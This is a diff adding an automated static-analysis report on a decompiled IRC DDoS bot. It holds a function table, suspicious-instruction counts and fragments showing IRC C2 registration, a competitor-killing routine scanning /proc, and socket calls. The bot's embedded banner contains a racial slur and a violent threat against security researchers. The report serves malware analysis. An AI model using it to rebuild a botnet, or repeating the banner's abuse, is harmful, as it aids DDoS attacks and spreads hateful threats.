+                    __GI_snprintf(str, 512, (int32_t)"/proc/%ld/cmdline");
+                    int32_t stream = __GI_fopen(str, (int32_t)&g11); // 0x8052af7
+        perror("can't open /proc");
+    if (__GI_snprintf(path, 64, (int32_t)"/proc/%i/exe") >= 0) {
+int32_t __GI_fopen(int32_t a1, int32_t a2) {
+    return _stdio_fopen(a1, (char *)a2, 0, -1);
+int32_t _stdio_fopen(int32_t a1, char * a2, int32_t a3, int32_t a4) {
+    int32_t v7 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&g27); // 0x80663c1
+        int32_t v15 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&g27); // 0x80663df
+    int32_t v1 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&g27); // 0x8067cfd
+        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&g27);
+================================================================================
+========	IP PATTERNS SUMMARY : =================================================
+================================================================================
+================================================================================
+========	SYSTEM CALLS SUMMARY : ================================================
+================================================================================
+                printf("Bot %s was not found on the system. It must have been running in memory.", (char *)v4);
+
+================================================================================
+========	FUNCTIONS LIST : =======================================================
+================================================================================
+FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
+----------------------------------------------------------------------------------------------
+__dns_lookup                                      |6   |1874    |73            |1592        |
+----------------------------------------------------------------------------------------------
+_fpmaxtostr                                       |0   |3972    |50            |3832        |
+----------------------------------------------------------------------------------------------
+main                                              |0   |412     |48            |305         |
+----------------------------------------------------------------------------------------------
+gethostbyname_r                                   |7   |686     |33            |0           |
+----------------------------------------------------------------------------------------------
+__read_etc_hosts_r                                |9   |637     |30            |317         |
+----------------------------------------------------------------------------------------------
+__open_nameservers                                |3   |454     |20            |291         |
+----------------------------------------------------------------------------------------------
+_ppfs_parsespec                                   |1   |1185    |20            |1152        |
+----------------------------------------------------------------------------------------------
+con                                               |0   |116     |18            |105         |
+----------------------------------------------------------------------------------------------
+__GI_clntudp_bufcreate                            |8   |257     |14            |0           |
+----------------------------------------------------------------------------------------------
+_stdio_fopen                                      |4   |1472    |13            |0           |
+----------------------------------------------------------------------------------------------
+botkill                                           |0   |66      |11            |60          |
+----------------------------------------------------------------------------------------------
+proc_find                                         |1   |67      |11            |38          |
+----------------------------------------------------------------------------------------------
+__get_myaddress                                   |2   |162     |9             |96          |
+----------------------------------------------------------------------------------------------
+__rpc_thread_destroy                              |0   |26      |8             |0           |
+----------------------------------------------------------------------------------------------
+memrchr                                           |3   |175     |6             |119         |
+----------------------------------------------------------------------------------------------
+__pthread_alt_unlock                              |1   |129     |6             |120         |
+----------------------------------------------------------------------------------------------
+__GI_opendir                                      |1   |102     |5             |0           |
+----------------------------------------------------------------------------------------------
+randstring                                        |1   |44      |5             |0           |
+----------------------------------------------------------------------------------------------
+inet_pton                                         |3   |440     |5             |386         |
+----------------------------------------------------------------------------------------------
+__pthread_destroy_specifics                       |0   |138     |5             |100         |
+----------------------------------------------------------------------------------------------
+__GI_bindresvport                                 |4   |113     |4             |39          |
+----------------------------------------------------------------------------------------------
+__pthread_reset_main_thread                       |0   |28      |4             |0           |
+----------------------------------------------------------------------------------------------
+_stdlib_strto_l                                   |4   |402     |4             |109         |
+----------------------------------------------------------------------------------------------
+xdr_bytes                                         |4   |165     |4             |0           |
+----------------------------------------------------------------------------------------------
+__rpc_thread_variables                            |1   |33      |3             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_lock                                    |1   |126     |3             |60          |
+----------------------------------------------------------------------------------------------
+__GI_closedir                                     |1   |34      |3             |0           |
+----------------------------------------------------------------------------------------------
+__GI_pthread_cond_wait                            |4   |421     |3             |72          |
+----------------------------------------------------------------------------------------------
+__GI_fclose                                       |1   |67      |3             |0           |
+----------------------------------------------------------------------------------------------
+_create_xid                                       |0   |21      |3             |0           |
+----------------------------------------------------------------------------------------------
+realrand                                          |2   |8       |3             |0           |
+----------------------------------------------------------------------------------------------
+rawmemchr                                         |4   |99      |2             |26          |
+----------------------------------------------------------------------------------------------
+__GI_sigprocmask                                  |4   |52      |2             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fgets_unlocked                               |4   |110     |2             |76          |
+----------------------------------------------------------------------------------------------
+__getdents64                                      |7   |100     |2             |59          |
+----------------------------------------------------------------------------------------------
+__stdio_WRITE                                     |4   |121     |2             |100         |
+----------------------------------------------------------------------------------------------
+__GI_readdir                                      |1   |78      |2             |57          |
+----------------------------------------------------------------------------------------------
+__malloc_consolidate                              |1   |212     |2             |165         |
+----------------------------------------------------------------------------------------------
+__GI_strspn                                       |4   |61      |2             |48          |
+----------------------------------------------------------------------------------------------
+__GI_wcsnrtombs                                   |5   |144     |2             |54          |
+----------------------------------------------------------------------------------------------
+__open_etc_hosts                                  |0   |13      |2             |0           |
+----------------------------------------------------------------------------------------------
+pthread_once                                      |4   |93      |2             |0           |
+----------------------------------------------------------------------------------------------
+_stdio_openlist_dec_use                           |0   |69      |2             |36          |
+----------------------------------------------------------------------------------------------
+__GI_pmap_unset                                   |1   |30      |2             |0           |
+----------------------------------------------------------------------------------------------
+inet_aton                                         |2   |110     |2             |96          |
+----------------------------------------------------------------------------------------------
+_stdio_term                                       |0   |70      |2             |40          |
+----------------------------------------------------------------------------------------------
+__decode_dotted                                   |4   |117     |2             |79          |
+----------------------------------------------------------------------------------------------
+_vfprintf_internal                                |3   |887     |2             |860         |
+----------------------------------------------------------------------------------------------
+_uintmaxtostr                                     |5   |120     |2             |49          |
+----------------------------------------------------------------------------------------------
+__GI_strpbrk                                      |2   |73      |2             |55          |
+----------------------------------------------------------------------------------------------
+__GI_vfprintf                                     |4   |61      |2             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_unlock                                  |1   |107     |2             |101         |
+----------------------------------------------------------------------------------------------
+__pthread_do_exit                                 |2   |126     |2             |33          |
+----------------------------------------------------------------------------------------------
+filter                                            |1   |20      |1             |16          |
+----------------------------------------------------------------------------------------------
+__GI_fopen                                        |2   |3       |1             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_acquire                                 |1   |45      |1             |23          |
+----------------------------------------------------------------------------------------------
+pthread_kill                                      |4   |35      |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_raise                                        |1   |17      |1             |0           |
+----------------------------------------------------------------------------------------------
+socket                                            |3   |2       |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strchr                                       |2   |26      |1             |17          |
+----------------------------------------------------------------------------------------------
+open                                              |2   |10      |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_waitpid                                    |3   |3       |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_close                                      |1   |19      |1             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_wait_for_restart_signal                 |1   |23      |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_vsnprintf                                    |4   |31      |1             |0           |
+----------------------------------------------------------------------------------------------
+_ppfs_init                                        |2   |84      |1             |40          |
+----------------------------------------------------------------------------------------------
+recv                                              |4   |9       |1             |0           |
+----------------------------------------------------------------------------------------------
+Send                                              |2   |9       |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_gethostbyname                                |1   |5       |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_send                                       |4   |2       |1             |0           |
+----------------------------------------------------------------------------------------------
+__rpc_thread_clnt_cleanup                         |0   |25      |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_connect                                    |3   |2       |1             |0           |
+----------------------------------------------------------------------------------------------
+suspend3                                          |0   |3       |1             |0           |
+----------------------------------------------------------------------------------------------
+wait4                                             |4   |22      |1             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_trylock                                 |3   |37      |1             |18          |
+----------------------------------------------------------------------------------------------
+__libc_fork                                       |0   |15      |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_open                                       |3   |26      |1             |0           |
+----------------------------------------------------------------------------------------------
+__getdents                                        |4   |54      |1             |0           |
+----------------------------------------------------------------------------------------------
+inet_addr                                         |1   |13      |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_clock_getres                                 |5   |13      |1             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_alt_trylock                             |3   |34      |1             |18          |
+----------------------------------------------------------------------------------------------
+__libc_recv                                       |4   |2       |1             |0           |
+----------------------------------------------------------------------------------------------
+svc_unregister                                    |4   |42      |1             |0           |
+----------------------------------------------------------------------------------------------
+__length_dotted                                   |2   |47      |1             |23          |
+----------------------------------------------------------------------------------------------
+svc_find                                          |3   |43      |1             |22          |
+----------------------------------------------------------------------------------------------
+__GI_strncat                                      |0   |45      |1             |20          |
+----------------------------------------------------------------------------------------------
+connect                                           |3   |9       |1             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_restart_new                             |1   |3       |1             |0           |
+----------------------------------------------------------------------------------------------
+__get_hosts_byname_r                              |7   |3       |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strcoll                                      |2   |25      |1             |17          |
+----------------------------------------------------------------------------------------------
+__GI_snprintf                                     |3   |4       |1             |0           |
+----------------------------------------------------------------------------------------------
+__encode_dotted                                   |7   |98      |1             |57          |
+----------------------------------------------------------------------------------------------
+suspend                                           |0   |3       |1             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_alt_lock                                |3   |54      |1             |45          |
+----------------------------------------------------------------------------------------------
+__pthread_perform_cleanup                         |1   |70      |1             |15          |
+----------------------------------------------------------------------------------------------
+waitpid                                           |3   |11      |1             |0           |
+----------------------------------------------------------------------------------------------
+_charpad                                          |0   |51      |1             |32          |
+----------------------------------------------------------------------------------------------
+inet_pton4                                        |3   |93      |1             |60          |
+----------------------------------------------------------------------------------------------
+__GI_setsockopt                                   |5   |2       |1             |0           |
+----------------------------------------------------------------------------------------------
+pmap_getport                                      |4   |23      |1             |0           |
+----------------------------------------------------------------------------------------------
+__libc_getpid                                     |1   |15      |1             |0           |
+----------------------------------------------------------------------------------------------
+gettimeofday                                      |4   |17      |1             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_find_self                               |0   |26      |1             |18          |
+----------------------------------------------------------------------------------------------
+_ppfs_setargs                                     |1   |190     |1             |87          |
+----------------------------------------------------------------------------------------------
+getexename                                        |1   |30      |1             |0           |
+----------------------------------------------------------------------------------------------
+suspend2                                          |2   |3       |1             |0           |
+----------------------------------------------------------------------------------------------
+bind                                              |3   |2       |1             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strcasecmp                                   |2   |36      |1             |30          |
+----------------------------------------------------------------------------------------------
+__GI___glibc_strerror_r                           |3   |5       |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_rfill                                     |1   |10      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_xdr_long                                     |0   |32      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI__exit                                        |1   |6       |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_trans2r_o                                 |3   |121     |0             |0           |
+----------------------------------------------------------------------------------------------
+xdr_u_long                                        |2   |41      |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_wcommit                                   |1   |21      |0             |0           |
+----------------------------------------------------------------------------------------------
+xdr_opaque                                        |3   |88      |0             |0           |
+----------------------------------------------------------------------------------------------
+getBuild                                          |0   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strdup                                       |1   |18      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_wcsrtombs                                    |0   |7       |0             |0           |
+----------------------------------------------------------------------------------------------
+_load_inttype                                     |0   |57      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_tolower                                      |1   |14      |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_lseek64                                    |4   |30      |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_poll                                       |4   |15      |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_once_fork_child                         |0   |16      |0             |0           |
+----------------------------------------------------------------------------------------------
+__encode_question                                 |0   |42      |0             |0           |
+----------------------------------------------------------------------------------------------
+xdr_opaque_auth                                   |2   |17      |0             |0           |
+----------------------------------------------------------------------------------------------
+authnone_create                                   |0   |52      |0             |0           |
+----------------------------------------------------------------------------------------------
+thread_self                                       |0   |29      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_pthread_setcanceltype                        |2   |35      |0             |0           |
+----------------------------------------------------------------------------------------------
+thread_self7                                      |2   |25      |0             |0           |
+----------------------------------------------------------------------------------------------
+__syscall_rt_sigaction                            |5   |15      |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_once_fork_parent                        |0   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__errno_location                                  |1   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_write                                      |3   |24      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_random_r                                     |2   |36      |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_mutex_init                                |2   |20      |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_adjust_position                           |4   |243     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI___uClibc_fini                                |0   |46      |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_mutexattr_setkind_np                    |2   |13      |0             |0           |
+----------------------------------------------------------------------------------------------
+__malloc_largebin_index                           |0   |22      |0             |0           |
+----------------------------------------------------------------------------------------------
+enqueue                                           |0   |5       |0             |0           |
+----------------------------------------------------------------------------------------------
+xdr_enum                                          |2   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fputs                                        |2   |39      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI___rpc_thread_createerr                       |0   |15      |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_cleanup_push_defer                      |3   |28      |0             |0           |
+----------------------------------------------------------------------------------------------
+munmap                                            |4   |17      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fcntl64                                      |4   |15      |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_mutexattr_init                            |1   |4       |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_init_mutex                                |1   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+mmap                                              |8   |9       |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_once_fork_prepare                       |0   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_select                                     |5   |17      |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_fwrite                                    |4   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+__decode_answer                                   |0   |69      |0             |0           |
+----------------------------------------------------------------------------------------------
+__malloc_trim                                     |0   |51      |0             |0           |
+----------------------------------------------------------------------------------------------
+thread_self5                                      |1   |25      |0             |0           |
+----------------------------------------------------------------------------------------------
+__xstat_conv                                      |4   |20      |0             |0           |
+----------------------------------------------------------------------------------------------
+__fresetlockfiles                                 |0   |21      |0             |0           |
+----------------------------------------------------------------------------------------------
+thread_self8                                      |1   |29      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_time                                         |1   |15      |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_mutexattr_destroy                         |1   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+thread_self6                                      |1   |29      |0             |0           |
+----------------------------------------------------------------------------------------------
+fstat                                             |4   |27      |0             |0           |
+----------------------------------------------------------------------------------------------
+__length_question                                 |0   |6       |0             |0           |
+----------------------------------------------------------------------------------------------
+__linuxthreads_death_event                        |0   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_sigdelset                                    |1   |17      |0             |0           |
+----------------------------------------------------------------------------------------------
+__rpc_thread_svc_cleanup                          |0   |14      |0             |0           |
+----------------------------------------------------------------------------------------------
+_pthread_cleanup_push                             |3   |25      |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_sigsuspend                                 |2   |15      |0             |0           |
+----------------------------------------------------------------------------------------------
+wait_node_dequeue                                 |0   |38      |0             |0           |
+----------------------------------------------------------------------------------------------
+thread_self3                                      |1   |25      |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_fcntl                                      |3   |32      |0             |0           |
+----------------------------------------------------------------------------------------------
+thread_self2                                      |2   |25      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_memset                                       |3   |4       |0             |0           |
+----------------------------------------------------------------------------------------------
+__encode_header                                   |0   |29      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI___h_errno_location                           |0   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+unknown_0                                         |1   |0       |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_cleanup_pop_restore                     |2   |44      |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_cond_broadcast                            |1   |35      |0             |0           |
+----------------------------------------------------------------------------------------------
+rpc_thread_multi                                  |0   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+ioctl                                             |3   |21      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_xdrmem_create                                |4   |9       |0             |0           |
+----------------------------------------------------------------------------------------------
+_store_inttype                                    |0   |34      |0             |0           |
+----------------------------------------------------------------------------------------------
+_ppfs_prepargs                                    |4   |18      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_wcrtomb                                      |0   |23      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fseek                                        |4   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fputs_unlocked                               |4   |12      |0             |0           |
+----------------------------------------------------------------------------------------------
+wait_node_free                                    |0   |10      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_mempcpy                                      |4   |7       |0             |0           |
+----------------------------------------------------------------------------------------------
+__decode_header                                   |0   |28      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_getpagesize                                  |1   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_xdr_callhdr                                  |2   |33      |0             |0           |
+----------------------------------------------------------------------------------------------
+_promoted_size                                    |1   |15      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_sbrk                                         |1   |61      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_exit                                         |1   |18      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_tcgetattr                                    |2   |28      |0             |0           |
+----------------------------------------------------------------------------------------------
+restart                                           |0   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_internal_tsd_set                        |4   |5       |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_pthread_self                                 |1   |4       |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_mutex_trylock                             |1   |124     |0             |0           |
+----------------------------------------------------------------------------------------------
+__xpg_strerror_r                                  |3   |167     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fwrite_unlocked                              |4   |74      |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_mutex_lock                                |1   |98      |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_trans2w_o                                 |4   |255     |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_brk                                          |1   |16      |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_mutex_unlock                              |1   |99      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_fseeko64                                     |4   |150     |0             |0           |
+----------------------------------------------------------------------------------------------
+getrlimit                                         |2   |13      |0             |0           |
+----------------------------------------------------------------------------------------------
+__drand48_iterate                                 |2   |27      |0             |0           |
+----------------------------------------------------------------------------------------------
+_pthread_cleanup_pop                              |2   |16      |0             |0           |
+----------------------------------------------------------------------------------------------
+sched_yield                                       |1   |15      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_strtok                                       |2   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+htons                                             |1   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+fcntl                                             |1   |9       |0             |0           |
+----------------------------------------------------------------------------------------------
+__socketcall                                      |2   |16      |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_sigaction                                  |3   |40      |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_seek                                      |4   |16      |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_call_handlers                             |0   |19      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_srand48_r                                    |2   |11      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_sigaction                                    |3   |118     |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_read                                       |3   |23      |0             |0           |
+----------------------------------------------------------------------------------------------
+thread_self4                                      |0   |25      |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_internal_tsd_get                        |1   |4       |0             |0           |
+----------------------------------------------------------------------------------------------
+pthread_cond_init                                 |2   |6       |0             |0           |
+----------------------------------------------------------------------------------------------
+__stdio_READ                                      |3   |30      |0             |0           |
+----------------------------------------------------------------------------------------------
+__pthread_set_own_extricate_if                    |2   |31      |0             |0           |
+----------------------------------------------------------------------------------------------
+restart2                                          |0   |3       |0             |0           |
+----------------------------------------------------------------------------------------------
+__libc_nanosleep                                  |2   |17      |0             |0           |
+----------------------------------------------------------------------------------------------
+__GI_memchr                                       |3   |24      |0             |0           |
+----------------------------------------------------------------------------------------------
+================================================================================
+========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
+================================================================================
+=================FUNCTION : __dns_lookup ===================
+++++++++ FUNCTION START 18816
+++++++++ FUNCTION END 20690
+++++++++ FUNCTION LENGTH 1874
+                        while (true) {
+                                int32_t v23 = __libc_close(-1); // 0x8065d16
+                                    int32_t v37 = inet_pton(-1, (char *)str2, (int32_t)&n); // 0x8065e8a
+                                        *(int32_t *)(g9 + 176) = inet_addr(-1);
+                                    int32_t v40 = socket(-1, str2, (int32_t)&n); // 0x8065ee5
+                                        if (__libc_connect(-1, str2, (int32_t)&n) >= 0) {
+                                            __libc_send(-1, str2, (int32_t)&n, (int32_t)&n);
+                                                int32_t v48 = __libc_recv(-1, str2, (int32_t)&n, (int32_t)&n); // 0x8065f7a
+                                                                            __libc_close(v10);
+                                                                        free(v11);
+                                                                        free(v11);
+                                                                            while (true) {
+                                                                                        __libc_close(-1);
+                                                                                            free(-1);
+                                                                                            free(-1);
+                                                                                        free(-1);
+                                                                                        free(-1);
+                                                                                                free(-1);
+                                                                                                __libc_close(-1);
+                                                                                                    free(-1);
+                                                                                                    free(-1);
+                                                                                                free(-1);
+                                                                                                    __libc_close(-1);
+                                                                                                        free(-1);
+                                                                                                        free(-1);
+                                                                                                    free(-1);
+                                                                                                __libc_close(-1);
+                                                                                                    free(-1);
+                                                                                                    free(-1);
+                                                                                                free(-1);
+                                                                                            free(-1);
+                                                                                            v93 = __libc_close(-1);
+                                                                                                v94 = free(-1);
+                                                                                                v96 = free(-1);
+                                                                                            v96 = free(-1);
+                                                                                    v93 = __libc_close(-1);
+                                                                                        v94 = free(-1);
+                                                                                        v96 = free(-1);
+                                                                                    v96 = free(-1);
+                                                                            __libc_close(-1);
+                                                                                free(-1);
+                                                                                free(-1);
+                                                                                free(-1);
+                                                                            free(-1);
+                                                                        __libc_close(-1);
+                                                                            free(-1);
+                                                                            free(-1);
+                                                                    __libc_close(-1);
+                                                                        free(-1);
+                                                                    __libc_close(v10);
+                                                                free(v11);
+                                                                free(v11);
+                                                                __libc_close(v10);
+                                                            free(v11);
+                                                            free(v11);
+                                    __libc_close(v10);
+                                free(v11);
+                                free(v11);
+                                __libc_close(v10);
+                            free(v11);
+                            v19 = free(v11);
+                    __libc_close(v10);
+                free(v11);
+                free(v11);
+                __libc_close(v10);
+            free(v11);
+            free(v11);
+            __libc_close(v10);
+        free(v11);
+        free(v11);
+        __libc_close(v10);
+    free(v11);
+    free(v11);
+=================FUNCTION : _fpmaxtostr ===================
+++++++++ FUNCTION START 13572
+++++++++ FUNCTION END 17544
+++++++++ FUNCTION LENGTH 3972
+                    while (true) {
+                        while (true) {
+                                        while (true) {
+                                                                                while (true) {
+                                                                                                while (true) {
+                                                                                            while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                    while (true) {
+                                                                    while (true) {
+                                                                while (true) {
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                while (true) {
+                                                                while (true) {
+                                                            while (true) {
+                                                                                    while (true) {
+                                                                                    while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                            while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                            while (true) {
+                                                                            while (true) {
+                                                                        while (true) {
+                                                                    while (true) {
+                                                                    while (true) {
+                                                                        while (true) {
+                                                                while (true) {
+                                                                    while (true) {
+                                                            while (true) {
+                                                                while (true) {
+                                                        while (true) {
+                                    while (true) {
+            while (true) {
+                                    while (true) {
+        while (true) {
+=================FUNCTION : main ===================
+++++++++ FUNCTION START 989
+++++++++ FUNCTION END 1401
+++++++++ FUNCTION LENGTH 412
+    puts((int32_t)"17 DDoS methods nigga! And for the netsec teams and feds reading this we will null all of your honeypots and slit your throats!!!");
+    botkill();
+    if (fork((int32_t)"17 DDoS methods nigga! And for the netsec teams and feds reading this we will null all of your honeypots and slit your throats!!!") != 0) {
+        v6 = __libc_getpid(v5);
+        seed = g4 + getppid(v5);
+        srand(seed);
+        v10 = realrand(4, 8);
+        g100 = randstring((char *)v10);
+        v11 = realrand(4, 8);
+        g99 = randstring((char *)v11);
+        v12 = realrand(4, 8);
+        g102 = randstring((char *)v12);
+        g105 = "#Pinet";
+        g104 = (int32_t)"KPinetK";
+        while (true) {
+            getBuild();
+            Send(g101, (int32_t)"NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n");
+            while (true) {
+                    while (true) {
+                        if (waitpid(*(int32_t *)(g106 + 4 * v24), 0, 1) >= 1) {
+                                    while (true) {
+                                free(g106);
+            int32_t v35 = recv(v20, v8, 0x1000, 0); // 0x80561e9
+        while (true) {
+                while (true) {
+            while (true) {
+                    __GI_strcasecmp((char *)*(int32_t *)&g33, v9);
+                        __GI_strcasecmp((char *)*v52, v9);
+                    v49 = __GI_strcasecmp((char *)&str4, (int32_t)"ERROR");
+                    while (true) {
+                        getBuild();
+                        Send(g101, (int32_t)"NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n");
+                    if (kill(pid, SIGKILL) == 0) {
+                v49 = __GI_strcasecmp((char *)&str4, (int32_t)"ERROR");
+    v6 = __libc_getpid(v5);
+    seed = g4 + getppid(v5);
+    srand(seed);
+    v10 = realrand(4, 8);
+    g100 = randstring((char *)v10);
+    v11 = realrand(4, 8);
+    g99 = randstring((char *)v11);
+    v12 = realrand(4, 8);
+    g102 = randstring((char *)v12);
+    g105 = "#Pinet";
+    g104 = (int32_t)"KPinetK";
+    while (true) {
+        getBuild();
+        Send(g101, (int32_t)"NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n");
+=================FUNCTION : gethostbyname_r ===================
+++++++++ FUNCTION START 10542
+++++++++ FUNCTION END 11228
+++++++++ FUNCTION LENGTH 686
+    int32_t v9 = __get_hosts_byname_r(str2, 2, v1, g4, a5, a6, v7); // 0x805ec75
+                            if (inet_aton(v30, v24) != 0) {
+                            __open_nameservers(str2, v24, n);
+                            v33 = __dns_lookup(v30, 1, g8, (int32_t)&g114, v31, (int32_t)&str4);
+                                    free(str4);
+                                        free(v13);
+                                        free(v13);
+                                free(v32);
+                                free(v13);
+                                if (inet_aton(v30, v24) != 0) {
+                                __open_nameservers(str2, v24, n);
+                                v33 = __dns_lookup(v30, 1, g8, (int32_t)&g114, v31, (int32_t)&str4);
+                                        free(str4);
+                                            free(v13);
+                                            free(v13);
+                                    free(v32);
+                                    free(v13);
+        if (inet_aton(v30, v24) != 0) {
+        __open_nameservers(str2, v24, n);
+        v33 = __dns_lookup(v30, 1, g8, (int32_t)&g114, v31, (int32_t)&str4);
+                free(str4);
+                    free(v13);
+                    free(v13);
+            free(v32);
+            free(v13);
+        if (inet_aton(v30, v24) != 0) {
+        __open_nameservers(str2, v24, n);
+        v33 = __dns_lookup(v30, 1, g8, (int32_t)&g114, v31, (int32_t)&str4);
+                free(str4);
+                    free(v13);
+                    free(v13);
+            free(v32);
+            free(v13);
+=================FUNCTION : __read_etc_hosts_r ===================
+++++++++ FUNCTION START 22456
+++++++++ FUNCTION END 23093
+++++++++ FUNCTION LENGTH 637
+            if (fgets(str, size, g7) != 0) {
+                while (true) {
+                    __GI_fclose((int16_t *)size);
+                            v16 = __open_etc_hosts();
+                            if (fgets(str, size, g7) != 0) {
+                                while (true) {
+                                    __GI_fclose((int16_t *)size);
+                            v16 = __open_etc_hosts();
+                            if (fgets(str, size, g7) != 0) {
+                                while (true) {
+                                    __GI_fclose((int16_t *)size);
+    if (fgets(str, size, g7) != 0) {
+        while (true) {
+            while (true) {
+                    while (true) {
+                            while (true) {
+                                        while (true) {
+                                                while (true) {
+                                                    if (__GI_strcasecmp(v22, *(int32_t *)(g4 + 4 * v52)) == 0) {
+                                                                if (inet_pton(10, (char *)*(int32_t *)g4, v8) >= 1) {
+                                                                        __GI_fclose((int16_t *)size);
+                                                            if (inet_pton(2, (char *)*(int32_t *)g4, (int32_t)v10) >= 1) {
+                                                                    __GI_fclose((int16_t *)size);
+                                                        if (fgets(str, size, g7) == 0) {
+                                                        v33 = __GI_fclose((int16_t *)size);
+                                                if (fgets(str, size, g7) == 0) {
+                                        if (fgets(str, size, g7) == 0) {
+                                    if (fgets(str, size, g7) == 0) {
+                                __GI_fclose((int16_t *)size);
+            __GI_fclose((int16_t *)size);
+=================FUNCTION : __open_nameservers ===================
+++++++++ FUNCTION START 20693
+++++++++ FUNCTION END 21147
+++++++++ FUNCTION LENGTH 454
